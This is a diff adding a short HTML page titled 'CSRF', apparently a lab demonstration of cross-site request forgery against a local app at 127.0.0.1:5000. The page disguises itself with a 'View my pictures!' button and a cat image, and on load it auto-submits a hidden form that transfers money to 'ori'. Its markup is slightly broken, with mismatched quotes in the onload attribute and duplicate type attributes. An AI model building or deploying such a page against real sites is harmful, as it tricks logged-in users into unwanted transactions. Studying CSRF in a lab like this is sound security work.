@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>CSRF</title>
+	</head>
+	<body onload="document.forms[0].submit(); document.cookie = "token=1";>
+		<form action="http://127.0.0.1:5000/transfer-money" method="post">
+			<input type="hidden" name="sendTo" type="text" value="ori"/>
+			<input type="hidden" name="amount" type="number" value="1"/>
+			<input type="submit" value="View my pictures!"/>
+			<img src="cats.jpg">
+		</form>
+	</body>
+</html>
